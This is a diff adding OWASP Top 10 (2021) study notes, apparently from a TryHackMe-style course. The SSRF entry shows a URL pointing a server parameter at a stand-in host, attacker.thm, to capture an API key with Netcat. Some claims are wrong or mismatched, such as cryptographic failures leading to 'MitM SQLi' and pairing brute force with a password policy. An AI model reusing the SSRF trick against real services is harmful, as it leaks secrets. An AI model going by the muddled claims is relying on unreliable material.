@@ -1407,3 +1407,78 @@ Though limited, Burp Suite Community provides key features such as:
 + Decoder - offers data transformation; this can decode captured information or encode payloads before sending
 + Comparer - enables comparison of two pieces of data at either the word or byte level
 + Sequencer - employed for assessing the randomness of tokens (e.g. session cookie values, randomly generated data)
+
+## OWASP Top 10 (2021)
+### 1. Broken Access Control
+Broken access control allows attackers to bypass authorisation, which gives them access to sensitive data or perform tasks they should not be able to. 
+
+An example of this is <i>Insecure Direct Object Referencing (IDOR)</i>, which is an access control vulnerability where Direct Object References are exposed in a URL (e.g. https://bank.thm/account?id=111111). These objects can be files, users, account numbers, etc.
+
+### 2. Cryptographic Failures
+A cryptographic failure arises from the misuse/lack of cryptographic algorithms for protecting sensitive information (i.e. data in transit, data at rest). These result in the divulging of sensitive data linked to customers (e.g. names, DoBs, financial information, credentials).
+
+These often lead to MitM SQLi attacks.
+
+### 3. Injection
+Injection flaws occur when an application interprets user input as commands/parameters. Examples of these include SQL (i.e. passing SQL queries) and command injections (i.e. passing system commands).
+
+The main defence for preventing these attacks is ensuring that user input is not interpreted as queries/commands. These can be achieved by:
++ Using an allow list, where the input is compared to a list of safe inputs or characters; only input that is marked as safe is processed
++ Stripping input, where they are removed before processing if dangerous characters are detected
+
+### 4. Insecure Design
+Insecure design occur when an application's architecture is flawed. These can occur when an improper threat modelling is made during planning, which presents itself in the final version. An example of this is insecure password resets, where OTP can be brute-forced.
+
+### 5. Security Misconfiguration
+Security misconfigurations are related to keeping security configurations up-to-date. These include:
++ Poorly configured permissions on cloud services (e.g. S3 buckets)
++ Enabling unnecessary features (e.g. services, pages, privileges); an example is [Patreon hack](https://labs.detectify.com/writeups/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/), where a debugging interface was kept active
++ Default accounts with default passwords
++ Error messages that are overly detailed
++ Not using HTTP security headers
+
+These often lead to more vulnerabilities such as weak credentials, XML or command injections.
+
+### 6. Vulnerable & Outdated Components
+You may find that a application is vulnerable to a well-known exploit. In such cases, ready-to-use exploits can be found online (i.e. [Exploit-DB](https://www.exploit-db.com/exploits/41962).
+
+### 7. Identification & Authentication Failures
+Flaws in authentication mechanisms allows attackers to gain access to users' accounts and sensitive data. Some common flaws include:
++ Brute force attacks; can be avoided by using a strong password policy
++ Use of weak credentials; can be avoided by enforcing automatic lockouts after a number of attempts
++ Weak session cookies; can be avoided by using MFA
+
+### 8. Software & Data Integrity Failures
+These vulnerabilities are caused by the use of code/infrastructure without integrity checks. There are two types of vulnerabilities:
++ Software Integrity Failures 
++ Data Integrity Failures
+
+An example of software integrity can be seen in the use of code libraries. Inserting a library with a Subresource Integrity (SRI), which will be matched against the hash of the downloaded file.
+
+```
+<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+```
+
+An example of data integrity can be seen in the use of cookies. Cookies can be tampered with (i.e. changing username), which can potentially lead to impersonation. A solution to this was the use of JSON Web Tokens (JWT), which allow key-value pairs (i.e. header-payload-signature) that the server matches with its own secret key.
+
+### 9. Security Logging & Monitoring Failures
+Logging is crucial as it allows tracing of activities. Attackers' actions can be traced, which can then be evaluated for risk and impact. 
+
+The information in logs should include:
++ HTTP status codes
++ Time stamps
++ Usernames
++ API endpoints/page locations
++ IP addresses
+
+### 10. Server-seide Request Forgery (SSRF)
+SSRF vulnerabilities allow attackers to coerce a web application into sending requests on their behalf to arbitrary destinations while controling the contents of the requests itself. These arise from the use of third-party services.
+
+Take for example: https://www.mysite.com/sms?server=attacker.thm&msg=ABC
+
+Changing the server parameter to your own server can allow you to obtain the API key (i.e. by listening using Netcat).
+
+SSRF can be used further to:
++ Enumerate internal networks (i.e. IP addresses and ports)
++ Abuse trust relationships between servers and gain unrestricted access to services
++ Interact with non-HTTP services (i.e. to get RCE)
